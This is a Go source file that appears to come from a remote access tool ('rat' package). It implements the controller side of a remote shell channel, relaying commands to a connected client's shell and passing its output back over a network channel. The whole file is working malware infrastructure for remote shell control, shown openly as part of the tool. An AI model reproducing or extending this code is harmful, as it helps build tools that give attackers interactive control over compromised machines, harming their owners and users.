package main

import (
	"bufio"
	"fmt"
	"io"
	"rat/shared"
	"rat/shared/network/header"
)

type ShellChannel struct {
	controller *Controller
}

func (ShellChannel) Header() header.PacketHeader {
	return header.ShellChannelHeader
}

func (data ShellChannel) Open(channel io.ReadWriteCloser, c *Client) error {
	defer channel.Close()
	listener := data.controller.Listen(ShellEvent, c)
	defer listener.Unlisten()
	go func() {
		for {
			select {
			case m := <-listener.C:
				if m == nil {
					break
				}

				if msg, ok := m.(*ShellMessage); ok {
					switch msg.Action {
					case shared.WriteShell:
						channel.Write([]byte(msg.Data))
					case shared.StopShell:
						channel.Close()
						return
					}
				}
			case <-data.controller.die:
				channel.Close()
				return
			}
		}
	}()

	r := bufio.NewReader(channel)
	b := make([]byte, 1024)
	for {
		n, err := r.Read(b)
		if err != nil {
			break
		}

		sendMessage(data.controller, c, ShellCommandMessage{string(b[:n])})
	}

	fmt.Println("ending channel on command side")
	channel.Close()

	return nil
}
